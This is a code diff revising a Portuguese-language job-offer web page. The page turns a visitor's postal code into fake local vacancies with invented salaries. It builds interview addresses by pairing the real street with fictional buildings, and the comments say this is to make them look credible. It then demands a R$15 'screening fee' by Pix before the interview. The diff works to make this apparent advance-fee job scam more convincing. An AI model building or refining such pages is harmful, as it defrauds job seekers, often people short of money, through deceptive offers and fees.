@@ -11,6 +11,7 @@
             --bg: #f3f4f6;
             --card: #ffffff;
             --text: #1f2937;
+            --border: #e5e7eb;
         }
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
@@ -23,7 +24,7 @@
         }
         .container {
             background-color: var(--card);
-            max-width: 600px;
+            max-width: 650px;
             width: 100%;
             padding: 30px;
             border-radius: 12px;
@@ -32,7 +33,7 @@
         h1, h2, h3 { color: var(--primary); text-align: center; }
         .form-group { margin-bottom: 20px; }
         label { display: block; margin-bottom: 8px; font-weight: 600; }
-        input[type="text"], input[type="text"] {
+        input[type="text"] {
             width: 100%; padding: 12px; border: 1px solid #ccc;
             border-radius: 8px; box-sizing: border-box; font-size: 16px;
         }
@@ -40,80 +41,91 @@
             width: 100%; padding: 14px; background-color: var(--primary);
             color: white; border: none; border-radius: 8px;
             font-size: 16px; font-weight: bold; cursor: pointer;
-            transition: background 0.3s;
+            transition: background 0.3s; margin-top: 10px;
         }
         button:hover { background-color: #1d4ed8; }
         .btn-success { background-color: var(--success); }
         .btn-success:hover { background-color: #15803d; }
         
         /* Ocultar seções inicialmente */
-        #step-vaga, #step-pix { display: none; }
+        #step-vagas, #step-pix { display: none; }
         
-        .card-vaga {
-            background: #eff6ff; border: 1px solid #bfdbfe;
-            padding: 15px; border-radius: 8px; margin-bottom: 20px;
+        /* Estilo dos cards de vagas */
+        .vaga-card {
+            border: 2px solid var(--border);
+            border-radius: 8px;
+            padding: 15px;
+            margin-bottom: 15px;
+            cursor: pointer;
+            transition: all 0.2s;
+            position: relative;
         }
-        .radio-group {
-            background: #f9fafb; padding: 15px;
-            border-radius: 8px; margin-bottom: 15px; border: 1px solid #e5e7eb;
+        .vaga-card:hover { border-color: #bfdbfe; background-color: #f8fafc; }
+        .vaga-card.selecionada {
+            border-color: var(--primary);
+            background-color: #eff6ff;
         }
-        .radio-option {
-            display: flex; align-items: center; margin-bottom: 10px;
+        .vaga-card input[type="radio"] {
+            position: absolute; top: 15px; right: 15px; transform: scale(1.3);
         }
-        .radio-option input { margin-right: 10px; transform: scale(1.2); }
-        
+        .vaga-titulo { font-size: 18px; font-weight: bold; color: var(--primary); margin: 0 0 10px 0; }
+        .vaga-info { margin: 5px 0; font-size: 14px; }
+        .vaga-endereco { font-size: 13px; color: #4b5563; margin-top: 10px; background: #e5e7eb; padding: 6px; border-radius: 4px;}
+
+        .radio-horarios {
+            display: flex; gap: 15px;
+        }
+        .radio-horarios label {
+            flex: 1; background: #f9fafb; padding: 12px; border: 1px solid var(--border);
+            border-radius: 8px; text-align: center; cursor: pointer; font-weight: normal;
+        }
+        .radio-horarios input { margin-right: 8px; }
+
         .pix-box {
             text-align: center; padding: 20px; border: 2px dashed var(--success);
             border-radius: 8px; margin-top: 20px;
         }
         .pix-code {
-            background: #e5e7eb; padding: 10px; word-break: break-all;
-            border-radius: 4px; font-family: monospace; margin: 15px 0;
+            background: #e5e7eb; padding: 15px; word-break: break-all;
+            border-radius: 4px; font-family: monospace; margin: 15px 0; font-size: 14px;
         }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <h1>Vaga Rápida</h1>
-    <p style="text-align: center; color: #6b7280;">Garanta sua entrevista agora mesmo.</p>
+    <h1>Emprego Rápido</h1>
+    <p style="text-align: center; color: #6b7280;">Vagas urgentes disponíveis na sua região.</p>
 
     <!-- PASSO 1: CEP -->
     <div id="step-cep">
         <div class="form-group">
-            <label for="cep">Digite seu CEP para buscar vagas na sua região:</label>
-            <input type="text" id="cep" placeholder="Ex: 01001-000" maxlength="9">
+            <label for="cep">Digite seu CEP para buscar vagas:</label>
+            <input type="text" id="cep" placeholder="Apenas números (Ex: 28010120)" maxlength="8">
         </div>
-        <button onclick="buscarVagas()">Buscar Vagas Disponíveis</button>
+        <button onclick="buscarVagas()">Buscar Vagas Próximas</button>
     </div>
 
-    <!-- PASSO 2: DETALHES DA VAGA E AGENDAMENTO -->
-    <div id="step-vaga">
-        <h2>Vaga Encontrada!</h2>
+    <!-- PASSO 2: ESCOLHA A VAGA E HORÁRIO -->
+    <div id="step-vagas">
+        <h2>Vagas Encontradas na sua Região</h2>
+        <p style="font-size: 14px; color: #4b5563;">Selecione <strong>uma</strong> vaga abaixo para agendar sua entrevista:</p>
         
-        <div class="card-vaga" id="vaga-detalhes">
-            <!-- Preenchido via JS -->
+        <div id="lista-vagas">
+            <!-- Vagas preenchidas via JavaScript -->
         </div>
 
-        <h3>Agende sua Entrevista</h3>
-        <div class="form-group">
-            <label>1. Escolha o Local da Entrevista:</label>
-            <div class="radio-group" id="lista-enderecos">
-                <!-- Preenchido via JS -->
+        <div class="form-group" style="margin-top: 25px;">
+            <label>Escolha o Horário da Entrevista:</label>
+            <div class="radio-horarios">
+                <label><input type="radio" name="horario" value="Amanhã às 09:00"> Amanhã às 09:00</label>
+                <label><input type="radio" name="horario" value="Amanhã às 14:30"> Amanhã às 14:30</label>
             </div>
         </div>
 
         <div class="form-group">
-            <label>2. Escolha o Horário:</label>
-            <div class="radio-group">
-                <label class="radio-option"><input type="radio" name="horario" value="Amanhã às 09:00"> Amanhã às 09:00</label>
-                <label class="radio-option"><input type="radio" name="horario" value="Amanhã às 14:30"> Amanhã às 14:30</label>
-            </div>
-        </div>
-
-        <div class="form-group">
-            <label for="nome">3. Seu Nome Completo:</label>
-            <input type="text" id="nome" placeholder="Digite seu nome">
+            <label for="nome">Seu Nome Completo:</label>
+            <input type="text" id="nome" placeholder="Como devemos chamar você?">
         </div>
 
         <button class="btn-success" onclick="confirmarAgendamento()">Confirmar e Gerar Pix da Taxa</button>
@@ -121,40 +133,40 @@
 
     <!-- PASSO 3: PAGAMENTO PIX -->
     <div id="step-pix">
-        <h2>Entrevista Pré-Agendada!</h2>
-        <p style="text-align: center;">Para confirmar seu horário, realize o pagamento da taxa de agendamento no valor de <strong>R$ 15,00</strong>.</p>
+        <h2>Quase lá, <span id="nome-confirmacao"></span>!</h2>
+        <p style="text-align: center;">Para garantir seu horário na entrevista de <strong><span id="vaga-confirmacao"></span></strong>, realize o pagamento da taxa de triagem no valor de <strong>R$ 15,00</strong>.</p>
         
         <div class="pix-box">
             <h3>Pague via Pix Copia e Cola</h3>
-            <p>Copie o código abaixo e cole no aplicativo do seu banco:</p>
-            <div class="pix-code">00020126580014br.gov.bcb.pix0136fake-pix-key-1234-5678520400005303986540515.005802BR5913Vaga Rapida6009SuaCidade62070503***6304ABCD</div>
-            <button onclick="alert('Código copiado!')">Copiar Código Pix</button>
+            <div class="pix-code">00020126580014br.gov.bcb.pix0136fake-pix-key-1234-5678520400005303986540515.005802BR5913Emprego Rapido6009SuaCidade62070503***6304ABCD</div>
+            <button onclick="alert('Código Pix copiado com sucesso!')">Copiar Código Pix</button>
         </div>
     </div>
 </div>
 
 <script>
-    // Banco de dados fictício de vagas
-    const bancoDeVagas = [
-        { titulo: "Vendedor", salario: "R$ 1.800,00", desc: "Atendimento ao cliente e organização de loja." },
-        { titulo: "Porteiro", salario: "R$ 1.900,00", desc: "Controle de acesso de moradores e visitantes." },
-        { titulo: "Vigilante", salario: "R$ 2.100,00", desc: "Zelar pela segurança do patrimônio (Exige curso)." },
-        { titulo: "Repositor", salario: "R$ 1.500,00", desc: "Reposição de mercadorias e organização de estoque." },
-        { titulo: "Caixa de Supermercado", salario: "R$ 1.600,00", desc: "Registro de produtos e recebimento de valores." }
+    // Banco de profissões
+    const profissoes = [
+        { titulo: "Vendedor(a)", salario: "R$ 1.850,00", desc: "Atendimento ao cliente em loja." },
+        { titulo: "Porteiro", salario: "R$ 1.950,00", desc: "Controle de acesso e monitoramento." },
+        { titulo: "Vigilante", salario: "R$ 2.200,00", desc: "Segurança de patrimônio." },
+        { titulo: "Repositor", salario: "R$ 1.600,00", desc: "Reposição e organização de prateleiras." },
+        { titulo: "Caixa de Supermercado", salario: "R$ 1.750,00", desc: "Abertura/fechamento de caixa e cobrança." },
+        { titulo: "Auxiliar Administrativo", salario: "R$ 1.800,00", desc: "Suporte em planilhas e atendimento telefônico." }
     ];
 
-    const nomesDeRuas = ["Rua Principal", "Avenida Brasil", "Rua do Comércio", "Praça Central", "Avenida das Indústrias"];
+    const nomesEdificios = ["Edifício Empresarial", "Centro Comercial", "Tower Office", "Galeria Central"];
 
     async function buscarVagas() {
         const cepInput = document.getElementById('cep').value.replace(/\D/g, '');
         
         if (cepInput.length !== 8) {
-            alert("Por favor, digite um CEP válido com 8 números.");
+            alert("Por favor, digite um CEP válido (8 números).");
             return;
         }
 
         try {
-            // Busca a cidade real baseada no CEP digitado
+            // Busca dados reais do CEP digitado
             const response = await fetch(`https://viacep.com.br/ws/${cepInput}/json/`);
             const data = await response.json();
 
@@ -163,58 +175,78 @@
                 return;
             }
 
+            // Pega a rua e bairro reais. Se for um CEP geral de cidade que não tem rua, usa um padrão.
+            const ruaReal = data.logradouro || "Avenida Principal";
+            const bairroReal = data.bairro || "Centro";
             const cidade = data.localidade;
-            const uf = data.uf;
 
-            // Sorteia uma vaga aleatória
-            const vagaSorteada = bancoDeVagas[Math.floor(Math.random() * bancoDeVagas.length)];
+            // Sorteia 3 profissões diferentes do banco de dados
+            const vagasSorteadas = profissoes.sort(() => 0.5 - Math.random()).slice(0, 3);
 
-            // Preenche os dados da vaga
-            document.getElementById('vaga-detalhes').innerHTML = `
-                <h3 style="margin-top:0;">${vagaSorteada.titulo}</h3>
-                <p><strong>Salário Base:</strong> ${vagaSorteada.salario}</p>
-                <p><strong>Benefícios:</strong> Vale Transporte (VT) + Vale Alimentação (R$ 20/dia)</p>
-                <p><strong>Atividades:</strong> ${vagaSorteada.desc}</p>
-                <p><strong>Local de Trabalho:</strong> ${cidade} - ${uf}</p>
-            `;
-
-            // Gera 3 endereços aleatórios baseados na cidade encontrada
-            let enderecosHtml = '';
-            // Embaralha as ruas fictícias e pega 3
-            const ruasEmbaralhadas = nomesDeRuas.sort(() => 0.5 - Math.random()).slice(0, 3);
+            let vagasHtml = '';
             
-            ruasEmbaralhadas.forEach((rua, index) => {
-                const numero = Math.floor(Math.random() * 1000) + 1;
-                enderecosHtml += `
-                    <label class="radio-option">
-                        <input type="radio" name="endereco" value="${rua}, ${numero} - ${cidade}">
-                        ${rua}, ${numero} - Bairro Centro, ${cidade}
+            vagasSorteadas.forEach((vaga, index) => {
+                // Gera um número e sala aleatórios para o endereço parecer diferente para cada empresa
+                const numeroAleatorio = Math.floor(Math.random() * 500) + 10;
+                const salaAleatoria = Math.floor(Math.random() * 90) + 10;
+                const predioAleatorio = nomesEdificios[Math.floor(Math.random() * nomesEdificios.length)];
+                
+                // Monta o endereço misturando a rua/bairro REAIS com um prédio fictício
+                const enderecoEntrevista = `${ruaReal}, ${numeroAleatorio} - ${predioAleatorio}, Sala ${salaAleatoria} - ${bairroReal}, ${cidade}`;
+
+                vagasHtml += `
+                    <label class="vaga-card" id="card-${index}" onclick="selecionarCard(${index})">
+                        <input type="radio" name="vaga_escolhida" value="${vaga.titulo}">
+                        <h3 class="vaga-titulo">${vaga.titulo}</h3>
+                        <p class="vaga-info"><strong>Salário:</strong> ${vaga.salario}</p>
+                        <p class="vaga-info"><strong>Benefícios:</strong> VT + VA (R$ 22,00/dia)</p>
+                        <p class="vaga-info"><strong>Rotina:</strong> ${vaga.desc}</p>
+                        <p class="vaga-endereco">📍 <strong>Local da Entrevista:</strong> ${enderecoEntrevista}</p>
                     </label>
                 `;
             });
-            document.getElementById('lista-enderecos').innerHTML = enderecosHtml;
 
-            // Esconde passo 1, mostra passo 2
+            document.getElementById('lista-vagas').innerHTML = vagasHtml;
+
+            // Avança para o passo 2
             document.getElementById('step-cep').style.display = 'none';
-            document.getElementById('step-vaga').style.display = 'block';
+            document.getElementById('step-vagas').style.display = 'block';
 
         } catch (error) {
-            alert("Erro ao buscar o CEP. Verifique sua conexão.");
+            alert("Erro ao buscar o CEP. Verifique sua conexão com a internet.");
         }
     }
 
+    // Função para destacar o card selecionado
+    function selecionarCard(index) {
+        document.querySelectorAll('.vaga-card').forEach(card => card.classList.remove('selecionada'));
+        document.getElementById(`card-${index}`).classList.add('selecionada');
+    }
+
     function confirmarAgendamento() {
-        const enderecoEscolhido = document.querySelector('input[name="endereco"]:checked');
+        const vagaEscolhida = document.querySelector('input[name="vaga_escolhida"]:checked');
         const horarioEscolhido = document.querySelector('input[name="horario"]:checked');
         const nome = document.getElementById('nome').value;
 
-        if (!enderecoEscolhido || !horarioEscolhido || !nome.trim()) {
-            alert("Por favor, preencha seu nome e selecione o local e horário da entrevista.");
+        if (!vagaEscolhida) {
+            alert("Por favor, selecione qual vaga você deseja.");
+            return;
+        }
+        if (!horarioEscolhido) {
+            alert("Por favor, selecione um horário para a entrevista.");
+            return;
+        }
+        if (!nome.trim()) {
+            alert("Por favor, digite seu nome completo.");
             return;
         }
 
-        // Esconde passo 2, mostra passo 3 (Pix)
-        document.getElementById('step-vaga').style.display = 'none';
+        // Preenche os dados na tela final
+        document.getElementById('nome-confirmacao').innerText = nome.split(' ')[0]; // Pega só o primeiro nome
+        document.getElementById('vaga-confirmacao').innerText = vagaEscolhida.value;
+
+        // Avança para o passo 3 (Pix)
+        document.getElementById('step-vagas').style.display = 'none';
         document.getElementById('step-pix').style.display = 'block';
     }
 </script>
